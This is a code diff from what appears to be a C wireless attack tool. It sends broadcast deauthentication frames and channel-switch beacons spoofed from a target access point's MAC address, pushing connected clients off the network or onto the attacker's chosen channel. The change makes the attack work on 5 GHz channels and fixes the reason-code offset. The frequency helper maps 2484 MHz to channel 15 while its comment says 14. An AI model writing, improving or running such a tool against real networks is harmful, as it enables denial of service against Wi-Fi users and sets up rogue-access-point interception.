@@ -102,6 +102,14 @@ static int send_frame(int sock, int ifidx, const unsigned char *frame, int flen,
     return send(sock, buf, hdr->nlmsg_len, 0) > 0 ? 0 : -1;
 }
 
+static int freq_to_chan(int freq) {
+    if (freq >= 2412 && freq <= 2484) return (freq - 2407) / 5;       // 2.4 GHz: ch 1-14
+    if (freq >= 5160 && freq <= 5340) return (freq - 5000) / 5;       // 5 GHz low: ch 32-68
+    if (freq >= 5480 && freq <= 5720) return (freq - 5000) / 5;       // 5 GHz mid: ch 96-144
+    if (freq >= 5745 && freq <= 5885) return (freq - 5000) / 5;       // 5 GHz high: ch 149-177
+    return 0;
+}
+
 int main(int argc, char **argv) {
     if (argc < 7) {
         fprintf(stderr, "Usage: %s <iface> <ap_mac> <ssid> <ap_freq> <our_freq> [reason_code]\n", argv[0]);
@@ -119,23 +127,9 @@ int main(int argc, char **argv) {
     int our_freq = atoi(argv[5]);
     int reason = (argc >= 7) ? atoi(argv[6]) : 7;
     
-    // Calculate channel numbers
-    int ap_chan = 0, our_chan = 0;
-    if (ap_freq == 2412) ap_chan = 1; else if (ap_freq == 2417) ap_chan = 2;
-    else if (ap_freq == 2422) ap_chan = 3; else if (ap_freq == 2427) ap_chan = 4;
-    else if (ap_freq == 2432) ap_chan = 5; else if (ap_freq == 2437) ap_chan = 6;
-    else if (ap_freq == 2442) ap_chan = 7; else if (ap_freq == 2447) ap_chan = 8;
-    else if (ap_freq == 2452) ap_chan = 9; else if (ap_freq == 2457) ap_chan = 10;
-    else if (ap_freq == 2462) ap_chan = 11; else if (ap_freq == 2467) ap_chan = 12;
-    else if (ap_freq == 2472) ap_chan = 13;
-    
-    if (our_freq == 2412) our_chan = 1; else if (our_freq == 2417) our_chan = 2;
-    else if (our_freq == 2422) our_chan = 3; else if (our_freq == 2427) our_chan = 4;
-    else if (our_freq == 2432) our_chan = 5; else if (our_freq == 2437) our_chan = 6;
-    else if (our_freq == 2442) our_chan = 7; else if (our_freq == 2447) our_chan = 8;
-    else if (our_freq == 2452) our_chan = 9; else if (our_freq == 2457) our_chan = 10;
-    else if (our_freq == 2462) our_chan = 11; else if (our_freq == 2467) our_chan = 12;
-    else if (our_freq == 2472) our_chan = 13;
+    // Calculate channel numbers (2.4 GHz + 5 GHz)
+    int ap_chan = freq_to_chan(ap_freq);
+    int our_chan = freq_to_chan(our_freq);
     
     if (ap_chan == 0 || our_chan == 0) {
         fprintf(stderr, "Could not determine channel from frequencies %d/%d\n", ap_freq, our_freq);
@@ -153,8 +147,8 @@ int main(int argc, char **argv) {
     memcpy(deauth+4, bc, 6);
     memcpy(deauth+10, ap, 6);
     memcpy(deauth+16, ap, 6);
-    deauth[22] = reason & 0xFF;
-    deauth[23] = (reason >> 8) & 0xFF;
+    deauth[24] = reason & 0xFF;
+    deauth[25] = (reason >> 8) & 0xFF;
     
     // CSA Beacon: 0x80 (beacon) spoofed from AP's MAC, with SSID + CSA IE
     // Fixed header (24 bytes) + timestamp (8) + beacon interval (2) + capability (2) = 36 bytes before IEs
